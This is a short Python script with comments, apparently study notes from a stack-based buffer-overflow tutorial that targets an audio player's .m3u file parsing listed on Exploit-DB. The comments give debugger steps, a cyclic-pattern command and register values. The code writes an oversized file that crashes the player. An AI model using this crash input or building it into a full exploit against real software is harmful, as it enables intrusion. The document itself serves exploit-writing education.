# analysis for https://www.exploit-db.com/exploits/9186
# using this posts : https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/

# ragg2 -P 26069 -r > sampleFile26069.m3u

# open app, open dbg
# attach app to dbg
# open sampleFile.m3u
# see the content of eip : 4c58434b
# content of first stack address (where esp points to) : 58434e53

import sys
# crashes sys.stdout.write('\x44'*30000)
sys.stdout.write('\x44'*27500)
# doesn't crash sys.stdout.write('\x44'*25000)
# doesn't crash sys.stdout.write('\x44'*20000)